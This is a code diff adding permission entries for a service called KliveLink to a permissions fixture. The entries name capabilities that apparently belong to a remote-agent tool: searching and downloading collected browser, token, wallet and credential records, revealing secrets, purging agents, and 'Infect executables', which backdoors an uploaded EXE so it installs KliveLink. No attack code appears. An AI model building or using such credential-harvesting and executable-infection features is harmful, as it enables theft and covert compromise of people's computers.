@@ -967,6 +967,112 @@ export const PERMISSIONS: FixturePermission[] = [
     "sensitive": false
   },
   {
+    "key": "klivelink.agents.purge",
+    "service": "KliveLink",
+    "serviceKey": "klivelink",
+    "area": "Control",
+    "tier": "Critical",
+    "tierValue": 5,
+    "title": "Remove agents from Omnipotent",
+    "description": "Delete an agent and all of its commands, collection data and metadata from the server.",
+    "legacyRank": 5,
+    "implies": [
+      "klivelink.agents.view",
+      "klivelink.agents.destroy"
+    ],
+    "sensitive": true
+  },
+  {
+    "key": "klivelink.collection.view",
+    "service": "KliveLink",
+    "serviceKey": "klivelink",
+    "area": "Collection",
+    "tier": "Glance",
+    "tierValue": 1,
+    "title": "View collection summaries",
+    "description": "See snapshot status, coverage and category counts for an agent.",
+    "legacyRank": 5,
+    "implies": [
+      "klivelink.agents.view"
+    ],
+    "sensitive": true
+  },
+  {
+    "key": "klivelink.collection.search",
+    "service": "KliveLink",
+    "serviceKey": "klivelink",
+    "area": "Collection",
+    "tier": "Read",
+    "tierValue": 2,
+    "title": "Search collection records",
+    "description": "Search collected browser, token, wallet and credential records.",
+    "legacyRank": 5,
+    "implies": [
+      "klivelink.collection.view"
+    ],
+    "sensitive": true
+  },
+  {
+    "key": "klivelink.collection.download",
+    "service": "KliveLink",
+    "serviceKey": "klivelink",
+    "area": "Collection",
+    "tier": "Manage",
+    "tierValue": 4,
+    "title": "Download collection data",
+    "description": "Reveal secrets and download encrypted collection bundles.",
+    "legacyRank": 5,
+    "implies": [
+      "klivelink.collection.search"
+    ],
+    "sensitive": true
+  },
+  {
+    "key": "klivelink.collection.manage",
+    "service": "KliveLink",
+    "serviceKey": "klivelink",
+    "area": "Collection",
+    "tier": "Critical",
+    "tierValue": 5,
+    "title": "Manage collection",
+    "description": "Start a collection, change its profile, or delete a snapshot.",
+    "legacyRank": 5,
+    "implies": [
+      "klivelink.collection.download"
+    ],
+    "sensitive": true
+  },
+  {
+    "key": "klivelink.audit.view",
+    "service": "KliveLink",
+    "serviceKey": "klivelink",
+    "area": "Audit",
+    "tier": "Read",
+    "tierValue": 2,
+    "title": "View command audit",
+    "description": "Read the immutable command and purge audit trail.",
+    "legacyRank": 5,
+    "implies": [
+      "klivelink.agents.view"
+    ],
+    "sensitive": true
+  },
+  {
+    "key": "klivelink.infect",
+    "service": "KliveLink",
+    "serviceKey": "klivelink",
+    "area": "Infect",
+    "tier": "Critical",
+    "tierValue": 5,
+    "title": "Infect executables",
+    "description": "Upload an EXE and receive a copy that also installs KliveLink when run.",
+    "legacyRank": 5,
+    "implies": [
+      "klivelink.agents.control"
+    ],
+    "sensitive": true
+  },
+  {
     "key": "klivemail.overview.view",
     "service": "KliveMail",
     "serviceKey": "klivemail",
